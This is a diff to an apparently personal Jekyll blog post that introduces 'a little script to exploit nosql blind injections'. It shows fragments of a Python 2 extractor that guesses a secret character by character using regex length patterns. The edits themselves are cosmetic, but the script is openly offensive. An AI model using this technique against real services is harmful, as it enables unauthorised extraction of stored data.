@@ -5,8 +5,11 @@ date:   2017-01-30 14:45:00 +0100
 categories: jekyll update
 ---
 
+Here is a little script to exploit nosql blind injections
+
 {% highlight python %}
-#!/usr/bin/env python2                                                                                                                                                                                                                        
+
+#!/usr/bin/env python2
 
 import urllib2
 import time
@@ -26,7 +29,7 @@ def main():
 	tmp = ""
 	while i < len(CHARSET):
 		tmp += CHARSET[i]
-		if checkIfGood(tmp + '.' + '{' + str(21 - len(tmp)) + '}') == 1:
+		if checkIfGood(tmp + '.' + '{' + str(21 - len(tmp)) + '}') == 1: # 21 = len(nb_chars)
 			tmp = tmp[:-1]
 		else:
 			i = -1
@@ -39,6 +42,6 @@ def check_nb_chars():
 			print "OK : " + str(i)
 		i = i + 1
 
-# check_nb_chars()
+#check_nb_chars()
 main()
 {% endhighlight %}
